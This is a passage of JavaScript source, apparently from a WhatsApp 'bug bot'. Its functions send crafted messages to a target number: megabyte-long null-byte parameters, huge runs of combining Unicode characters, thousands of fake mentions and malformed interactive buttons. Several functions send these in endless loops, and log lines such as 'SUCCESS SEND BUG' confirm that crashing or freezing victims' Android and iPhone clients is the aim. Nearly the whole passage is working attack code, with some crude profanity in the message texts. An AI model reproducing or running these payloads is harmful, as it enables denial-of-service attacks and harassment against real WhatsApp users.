            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});

const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " Kontol ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
    
  const msg3 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x12".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215)
      .toString(16)
      .padStart(6, "99999999")
  });

  const msg4 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };
  const msg5 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };
    let msg6 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "@Xatanicvxii",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});
    for (const msg of [msg1, msg2, msg3, msg4, msg5, msg6]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.green("SUCCESS SEND BUG"));
  }
}


async function Qivisix(sock, target) {
  while (true) {
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "Halo Paket", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    console.log(`Bug terkirim ke target: ${target} - ${new Date().toLocaleTimeString()}`);
    await new Promise(res => setTimeout(res, 300));
  }
}

async function iphoneinvisibleNew(target) {
    const pyth = 60000;
    while (true) {
        const msg = {
            message: {
                locationMessage: {
                    degreesLatitude: 21.1266,
                    degreesLongitude: -11.8199,
                    name: "Malaysia - kocheng"
                        + "\u0000".repeat(pyth)
                        + "𑇂𑆵𑆴𑆿".repeat(pyth),
                    url: "https://t.me/Xatanicvxii",
                    contextInfo: {
                        externalAdReply: {
                            quotedAd: {
                                advertiserName: "𑇂𑆵𑆴𑆿".repeat(pyth),
                                mediaType: "IMAGE",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                caption: "𑇂𑆵𑆴𑆿".repeat(pyth)
                            },
                            placeholderKey: {
                                remoteJid: "0s.whatsapp.net",
                                fromMe: false,
                                id: "ABCDEF1234567890"
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key?.id || undefined,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });
      console.log(chalk.green(`Succes Send Bug iPhone ${target}`));
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
}

async function CYCSIXV2(sock, target) {
  const msgCarousel = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "Hahaha alay", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          contextInfo: {
            entryPointConversionSource: "call_permission_request"
          }
        }
      }
    }
  }, {
    userJid: target,
    messageId: undefined,
    messageTimestamp: (Date.now() / 1000) | 0
  });
  await sock.relayMessage("status@broadcast", msgCarousel.message, {
    messageId: msgCarousel.key?.id || undefined,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target });
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "HALO AKU SUKA PERMEN", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});

  const msg2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "PERMEN ENAK LOH ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
    
  const msg3 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: " WHAT PERMEN",
            format: "BOLD"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });

  const msg4 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  const msg5 = {
    extendedTextMessage: {
      text: "ꦾ".repeat(300000),
      contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          )
        ]
      }
    }
  };

  const msg6 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { messageSecret: crypto.randomBytes(32) },
        interactiveResponseMessage: {
          body: { text: " WHAT BRO? ", format: "BOLD" },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "MAKLUH",
              newsletterJid: "99999999999@newsletter",
              serverMessageId: 1
            },
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});
  for (const msg of [msg1, msg2, msg3, msg4, msg5, msg6]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.green("SUCCESS SEND CYCSIXV2"));
  }
}

async function glowInvis(sock, target) {
  while (true) {
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "YOK MAKAN PERMEN", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    })

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target })
  }
}

async function notificationblank(sock, target) {
  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQNUlmFQCflj-o4DnkkqBD4dXmdF0J5mOAGHGmOBDv3xZmtq4W9LY8BC7da1MpgpEmzzIzkze6beOUhTs6pBnav3pOPMexEWn9LjoT3QOw?ccb=9-4&oh=01_Q5Aa2QGEGLzQfGw8rA0j77_p8R7jcCDlLi4V-gnHyyeOnFNAWQ&oe=68D151D5&_nc_sid=e6ed6c&mms3=true",
              directPath: "/o1/v/t24/f2/m269/AQNUlmFQCflj-o4DnkkqBD4dXmdF0J5mOAGHGmOBDv3xZmtq4W9LY8BC7da1MpgpEmzzIzkze6beOUhTs6pBnav3pOPMexEWn9LjoT3QOw?ccb=9-4&oh=01_Q5Aa2QGEGLzQfGw8rA0j77_p8R7jcCDlLi4V-gnHyyeOnFNAWQ&oe=68D151D5&_nc_sid=e6ed6c",
              mimetype: "image/jpeg",
              mediaKey: "2fXXmVelp53Ffz5tv7J0UJyEmUEoFbfpeGcgG21zKk4=",
              fileEncSha256: "I/6MTYL3oRDBI3dPez/v6V0Meq90dRerYyhWJF0PYDw=",
              fileSha256: "ExVmZkmvhmJRraU4undM/3Zcz80Ju46UkTWd2eRWMX8=",
              fileLength: "46031",
              mediaKeyTimestamp: "1755963474"
            }
          },
          body: {
            text: "halo makan permen yuk" + "ꦾ".repeat(30000), 
          },
          footer: {
            text: "p bang" + "ꦽ".repeat(10000), 
          },
          nativeFlowMessage: {
            messageParamsJson: ")}".repeat(5000), 
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              }
            ],
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(message), { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

}

async function crashDelay(target) {
  const thumbnailOrg = "https://ibb.co.com/XZyfRgHy";

  const msg = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: { 
          text: "Sate Nya bang" + "៝𑇂𑆵𑆴𑆿".repeat(90000),
          matchedText: "ᝯׁ֒ᨵׁׅׅ ҉҈⃝⃞abim⃟⃠⃤꙰꙲꙱֪",
          description: "Sate Nya bang" + "៝𑇂𑆵𑆴𑆿".repeat(30000), 
          title: "null",
          previewType: "NONE",
          jpegThumbnail: Buffer.from(await (await fetch(thumbnailOrg)).arrayBuffer())
        },
        externalAdReply: {
          title: "ꦾ".repeat(9999),
          body: "Kntl",
          thumbnailUrl: thumbnailOrg,
          mediaType: 1,
          mediaUrl: "https://eporner.com",
          sourceUrl: "https://eporner.com"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select", 
              buttonParamsJson: "Sate Nya bang" + "៝𑇂𑆵𑆴𑆿".repeat(30000)
            }, 
            {
              name: "call_permission_request", 
              buttonParamsJson: "៝𑇂𑆵𑆴𑆿".repeat(10000)
            }, 
            {
              name: "address_message", 
              ParamsJson: "\u0000".repeat(5000)
            }, 
            {
              name: "call_permission_request", 
              buttonParamsJson: "Sate Nya bang" + "៝𑇂𑆵𑆴𑆿".repeat(30000)
            }
          ],
          messageParamsJson: "{{".repeat(10000)
        }
      }
    }
  };

  // relayMessage tetap sama
  await sock.relayMessage(
    target,
    msg,
    {
      messageId: "random-id-" + Date.now(),
      participant: target
    }
  );
}


async function ButtonPayment(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400
                },
              },
            },
            body: {
              text: "PERMEN DISINI" + "ោ៝".repeat(20000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            stickerMessage: {
              url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
              fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
              fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
              mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
              mimetype: "application/was",
              height: 512,
              width: 512,
              directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
              fileLength: "14390",
              mediaKeyTimestamp: "1760786856",
              isAnimated: true,
              stickerSentTs: "1760786855983",
              isAvatar: false,
              isAiSticker: false,
              isLottie: true,
            },
          },
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(chalk.red(`Succes Send ${target}`));
}

async function UIMention(sock, target, mention = true) {
  const qwerty = "https://files.catbox.moe/4x4hzu.jpg"
  const msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { 
              text: "\n" + "\n" + "\u200B" + "ꦾ".repeat(10000) + "ꦽ".repeat(2500) + "ោ៝".repeat(2500)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_id: Date.now(),
                    flow_message_version: "9",
                    flow_token: Date.now(),
                    flow_action: "share",
                    flow_action_payload: {
                      screen: "GALLERY_SCREEN",
                      params: {
                        media_type: "image",
                        max_selection: 9999999
                      }
                    },
                    flow_cta: "x",
                    icon: qwerty,
                    updated_at: null,
                    experimental_flags: {
                      use_native_flow_v2: true,
                      enable_logging_context: true
                    }
                  })
                }
              ]
            },
            ...(mention ? { contextInfo: { mentionedJid: [target] } } : {})
          }
        }
      }
    }),
    {}
  );

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function LoveForYou(target, mention) {
  try {
    let hell = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Xatanical",
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000),
                version: 3,
              },
            },
          },
        },
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0"),
      }
    );

    await sock.relayMessage("status@broadcast", hell.message, {
      messageId: hell.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: hell.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
    let message = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath:
              "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 400 }, () => {
                  return (
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                  );
                }),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
          },
        },
      },
    };

    const stickerMsg = generateWAMessageFromContent(target, message, {});
    await sock.relayMessage("status@broadcast", stickerMsg.message, {
      messageId: stickerMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });
    console.log(chalk.red("Send Bug sukses"));
    while (true) {
      const msg = await generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  version: 3,
                  name: "call_permission_request",
                  paramsJson: "\u0000".repeat(1045000),
                },
                body: {
                  text: "HOLAA",
                  format: "DEFAULT",
                },
              },
            },
          },
        },
        {
          isForwarded: false,
          ephemeralExpiration: 0,
          background:
            "#" +
            Math.floor(Math.random() * 16777215)
              .toString(16)
              .padStart(6, "0"),
          forwardingScore: 0,
          font: Math.floor(Math.random() * 9),
        }
      );

      await sock.relayMessage("status@broadcast", msg.message, {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  { tag: "to", attrs: { jid: target }, content: undefined },
                ],
              },
            ],
          },
        ],
        statusJidList: [target],
        messageId: msg.key.id,
      });

      if (mention) {
        await sock.relayMessage(
          target,
          {
            statusMentionMessage: {
              message: { protocolMessage: { key: msg.key, type: 25 } },
            },
          },
          {}
        );
      }

      await sleep(1500);
    }
  } catch (err) {
    console.log(chalk.red("LoveForYou Error →"), err);
  }
}

async function LolipopIos(sock, target, mention) {
const MYDelicious = "ANJAY" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "MY WIFE" + MYDelicious,
            matchedText: "͜",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAA",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 64991,
            thumbnailWidth: 672740,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      console.log(chalk.red(`BUG DIKIRIM KE => ${target}`));
   } catch (err) {
      console.error(err);
   }
};

async function CycsixvLite(sock,target, mention) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000)
              },
              body: {
                text: "FEELING GOOD LAKASUT",
                format: "BOLD"
              }
            }
          }
        }
      },
      {
        isForwarded: false,
        ephemeralExpiration: 0,
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0"),
        forwardingScore: 0,
        font: Math.floor(Math.random() * 9)
      }
    );

    await sock.relayMessage("status@broadcast", msg.message, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ],
      statusJidList: [target],
      messageId: msg.key.id
    });
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: { protocolMessage: { key: msg.key, type: 25 } }
          }
        },
        {}
      );
    }

    console.log(`[CycsixvLite] Bug terkirim ke ${target}`);
    await sleep(5000);
    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "NGENTOD YOK", format: "BOLD" },
            nativeFlowResponseMessage: {
